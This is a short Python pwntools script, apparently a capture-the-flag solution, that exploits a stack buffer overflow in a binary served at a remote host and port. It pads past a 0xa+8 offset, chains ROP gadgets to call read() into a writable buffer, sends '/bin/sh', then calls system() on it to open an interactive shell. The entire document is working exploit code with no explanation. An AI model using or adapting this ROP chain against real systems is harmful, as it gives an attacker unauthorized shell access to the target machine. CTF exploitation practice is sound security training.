from pwn import *

p = remote("gz.imxbt.cn",20322)
# p = process('./彻底失去她')
rdi = 0x0000000000401196
rsi = 0x00000000004011ad
rdx = 0x0000000000401265
ret = 0x000000000040101a
offset = 0xa+8
buf = 0x00000000004040A0
system = 0x000000000401080
read = 0x0000000000401090


payload = b'a' * (0xa + 8)
payload += p64(rdi) + p64(0)
payload += p64(rsi) + p64(buf)
payload += p64(rdx) + p64(0x100)
payload += p64(read)
payload += p64(rdi) + p64(buf) + p64(system)
p.sendline(payload)
p.sendline(b'/bin/sh\x00')
p.interactive()


